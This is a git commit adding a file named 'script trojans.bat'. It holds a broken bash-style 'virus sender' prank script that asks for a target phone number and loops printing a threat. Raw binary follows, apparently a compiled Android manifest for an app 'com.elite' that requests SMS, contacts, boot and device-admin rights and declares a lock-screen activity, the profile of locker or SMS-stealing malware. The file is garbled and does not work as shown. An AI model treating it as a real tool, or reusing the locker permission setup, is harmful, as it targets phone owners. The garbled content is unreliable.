f2ad2cd0a749ca5ad173b4b8562a1d6a70188ff2
azhar956 <77155911+azhar956@users.noreply.github.com>
2021-02-10 16:36:58 +0700

    Add files via upload

---
+++ script trojans.bat
@@ -0,0 +1,27 @@
+#1/bin/bash
+
+clear
+echo -e "==========================="
+echo -e " Author : Mr.Vatality"
+echo -e " WhatsApp : 081223204118"
+echo -e " Team Anonymous Eror System"
+echo -e "==========================="
+read -p "Masukan No Target : " nomor:
+while [[true]]; do
+echo -e "Mencoba Mengirim Virus Ke Nomor $nomor"
+done 
+᧐ ఈ D     Ĭ      4 R v   ¨ ¶ à ø Ė ľ Ŕ Ţ ź Ɣ Ƭ ǀ ǔ Ǧ Ǹ Ȋ ɢ ɦ ɸ ʌ ʢ ʬ ˀ ˢ ̞ ͨ Ψ Ϣ М ј Ҝ Ӱ Ն ֜ ע ؞ ظ ٤ ٸ ڨ ۆ ۖ ܎ ܢ ݦ ަ ߞ ࠠ ࠲ ࡮ ࢂ ࢴ ऀ ख ॊ জ ৊ ਜ ੌ ઘ ૊ versionCode versionName 
+minSdkVersion targetSdkVersion name allowBackup icon label manageSpaceActivity 
+debuggable 
+configChanges excludeFromRecents 	noHistory theme 
+launchMode description 
+permission resource priority enabled process android *http://schemas.android.com/apk/res/android   package manifest 	com.elite 1.0 uses-sdk uses-permission android.permission.GET_TASKS #android.permission.READ_PHONE_STATE android.permission.RECEIVE_SMS android.permission.SEND_SMS android.permission.READ_SMS android.permission.WRITE_SMS  android.permission.READ_CONTACTS (android.permission.READ_EXTERNAL_STORAGE )android.permission.WRITE_EXTERNAL_STORAGE )android.permission.RECEIVE_BOOT_COMPLETED !android.permission.WRITE_SETTINGS android.permission.WAKE_LOCK application com.elite.LockScreen activity com.elite.MainActivity 
+intent-filter action android.intent.action.MAIN category  android.intent.category.LAUNCHER com.elite.UninstallAdminDevice android.intent.action.SEND android.intent.category.DEFAULT service com.elite.IntentServiceClass receiver com.elite.AdminReciever $android.permission.BIND_DEVICE_ADMIN 	meta-data android.app.device_admin 'android.app.action.DEVICE_ADMIN_ENABLED com.elite.SMSReceiver 'android.provider.Telephony.SMS_RECEIVED com.elite.BootReceiver $android.intent.action.BOOT_COMPLETED com.elite.AlarmReceiver :remote ƀ\ țāȜāȌāɰāāʀāāāāāāāȭā āā āā%āāāāĀ  ￿￿  Ă`  ￿￿￿￿       ￿￿က    ̀ ￿￿  ̀ ĂL  ￿￿￿￿      ￿￿က   ￿￿က ă 	 ￿￿￿￿ Ă8  ￿￿￿￿       ̀ ă  ￿￿￿￿ Ă8  ￿￿￿￿       ̀ ă  ￿￿￿￿ Ă8 
+ ￿￿￿￿        ̀  ă 
+ ￿￿￿￿ Ă8  ￿￿￿￿      ! ̀! ă  ￿￿￿￿ Ă8  ￿￿￿￿      " ̀" ă  ￿￿￿￿ Ă8  ￿￿￿￿      # ̀# ă  ￿￿￿￿ Ă8  ￿￿￿￿      $ ̀$ ă  ￿￿￿￿ Ă8  ￿￿￿￿      % ̀% ă  ￿￿￿￿ Ă8  ￿￿￿￿      & ̀& ă  ￿￿￿￿ Ă8  ￿￿￿￿      ' ̀' ă  ￿￿￿￿ Ă8  ￿￿￿￿      ( ̀( ă  ￿￿￿￿ Ă8  ￿￿￿￿      ) ̀) ă  ￿￿￿￿ Ă  ￿￿￿￿*      ￿￿Ā 缈  ￿￿Ā缂  + ̀+  	 ￿￿ሀ￿￿  ￿￿ሀ￿￿Ăt  ￿￿￿￿,      ￿￿Ā 缈  - ̀-   ￿￿ሀ￿￿ 
+ ￿￿ᄀҠ Ă$ $ ￿￿￿￿.     Ă8 % ￿￿￿￿/      0 ̀0 ă % ￿￿￿￿/ Ă8 ' ￿￿￿￿1      2 ̀2 ă ' ￿￿￿￿1 ă ( ￿￿￿￿. ă ) ￿￿￿￿, Ă , ￿￿￿￿,     
+ ￿￿Ā
+ă  ￿￿Ā 缈  + ̀+  
+ ￿￿ᄀҠ   ￿￿ሀ￿￿ă 2 ￿￿￿￿, Ă 5 ￿￿￿￿,     
+ ￿￿Ā缉  ￿￿Ā 缈  3 ̀3   ￿￿က  
+ ￿￿ᄀҠ Ă$ ; ￿￿￿￿.     Ă8 < ￿￿￿￿/      4 ̀4 ă < ￿￿￿￿/ Ă8 > ￿￿￿￿1      5 ̀5 ă > ￿￿￿￿1 ă ? ￿￿￿￿. ă @ ￿￿￿￿, Ă8 C ￿￿￿￿6      7 ̀7 ă C ￿￿￿￿6 Ăt F ￿￿￿￿8      ￿￿Ā缈  9 ̀9   : ̀:   ￿￿Ā缈ĂL K ￿￿￿￿;      < ̀<   ￿￿Ā 缅ă M ￿￿￿￿; Ă$ O ￿￿￿￿.     Ă8 P ￿￿￿￿/      = ̀= ă P ￿￿￿￿/ ă Q ￿￿￿￿. ă R ￿￿￿￿8 Ă8 U ￿￿￿￿8      > ̀> Ă8 V ￿￿￿￿.      ￿￿က￿翿Ă8 W ￿￿￿￿/      ? ̀? ă W ￿￿￿￿/ ă X ￿￿￿￿. ă Y ￿￿￿￿8 ĂL \ ￿￿￿￿8      @ ̀@   ￿￿ሀ￿￿Ă$ _ ￿￿￿￿.     Ă8 ` ￿￿￿￿/      A ̀A ă ` ￿￿￿￿/ Ă8 b ￿￿￿￿1      5 ̀5 ă b ￿￿￿￿1 ă c ￿￿￿￿. ă d ￿￿￿￿8 Ă` g ￿￿￿￿8      B ̀B   ￿￿ሀ￿￿  C ̀C ă k ￿￿￿￿8 ă l ￿￿￿￿* ă n ￿￿￿￿ ā n ￿￿  
